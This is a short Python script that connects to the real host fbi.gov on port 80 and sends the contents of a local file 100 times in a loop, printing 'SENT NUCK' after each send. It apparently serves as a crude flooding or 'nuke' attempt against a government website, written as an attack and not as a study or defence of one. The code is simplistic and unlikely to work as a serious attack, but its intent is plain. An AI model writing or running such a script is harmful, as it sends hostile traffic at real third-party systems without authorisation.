import socket
import os

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target IP address and port
sock.connect(("fbi.gov", 80))

# Send the data file
with open("data.txt", "rb") as f:
   data = f.read()
   for i in range(100):
       try:
           sock.sendall(data)
           print('SENT NUCK')
       except Exception as e:
           print(str(e)) 

# Close the connection
sock.close()